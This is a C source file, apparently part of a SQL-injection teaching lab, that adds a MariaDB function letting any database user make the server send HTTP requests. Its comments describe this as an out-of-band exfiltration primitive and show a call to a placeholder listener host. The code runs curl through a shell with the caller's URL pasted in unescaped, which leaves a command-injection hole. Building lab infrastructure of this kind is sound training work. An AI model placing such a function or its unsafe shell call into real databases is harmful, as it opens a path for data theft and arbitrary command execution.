/*
 * udf/http_get.c, MariaDB UDF: fire an HTTP GET from inside the database.
 *
 * Teaching purpose: once installed, any SQL session that can SELECT may call
 *
 *   http_get('http://listener-host/some/path')
 *
 * and MariaDB's own server process originates a real outbound HTTP request
 * to that URL, with zero involvement from the application layer.  That is
 * the canonical out-of-band SQL-injection primitive: the *database engine*
 * phones home, independent of whatever the application does (or does not do)
 * with the query result.
 *
 * Return value: the HTTP status code as a string (e.g. "200", "404").
 * Callers that want fire-and-forget can ignore it; the point is the
 * side-effect, not what comes back.
 *
 * Build (done by mariadb/Dockerfile, build context = repo root):
 *   gcc -shared -fPIC -nostartfiles \
 *       -I/usr/include/mariadb \
 *       -o /usr/lib/mysql/plugin/http_get.so \
 *       udf/http_get.c
 *
 * Register once, as root, in any seed SQL file:
 *   CREATE FUNCTION http_get RETURNS STRING SONAME 'http_get.so';
 *
 * The function is global (stored in mysql.func) and callable by any user.
 */

#include <mysql.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

my_bool http_get_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    if (args->arg_count != 1) {
        strncpy(message, "http_get() requires exactly one string argument",
                MYSQL_ERRMSG_SIZE);
        return 1;
    }
    args->arg_type[0] = STRING_RESULT;
    initid->max_length = 8;    /* enough for "200", "404", "000" */
    initid->maybe_null = 1;
    initid->const_item = 0;
    return 0;
}

void http_get_deinit(UDF_INIT *initid __attribute__((unused))) {}

char *http_get(UDF_INIT   *initid __attribute__((unused)),
               UDF_ARGS   *args,
               char       *result,
               unsigned long *length,
               char       *is_null,
               char       *error  __attribute__((unused)))
{
    if (!args->args[0] || args->lengths[0] == 0) {
        *is_null = 1;
        return NULL;
    }

    /*
     * Cap URL length to stay comfortably inside cmd[].
     * --globoff: stop curl from interpreting { } as glob patterns (the flag
     *   value contains braces; without this curl errors on them).
     * -o /dev/null: discard the response body; we only want the status code.
     * -w '%{http_code}': write just the three-digit HTTP status to stdout so
     *   we can return it to the SQL caller as a string.
     * --max-time 5: don't block the DB thread forever on a dead host.
     * --: treat the next argument as a URL even if it starts with a dash.
     */
    unsigned long url_len = args->lengths[0] < 3800 ? args->lengths[0] : 3800;

    char cmd[4096];
    int n = snprintf(cmd, sizeof(cmd),
                     "curl -s --globoff -o /dev/null -w '%%{http_code}' "
                     "--max-time 5 -- \"%.*s\" 2>/dev/null",
                     (int)url_len, args->args[0]);

    if (n < 0 || n >= (int)sizeof(cmd)) {
        *is_null = 1;
        return NULL;
    }

    FILE *fp = popen(cmd, "r");
    if (!fp) {
        *is_null = 1;
        return NULL;
    }

    *length = fread(result, 1, 8, fp);
    pclose(fp);
    return result;
}
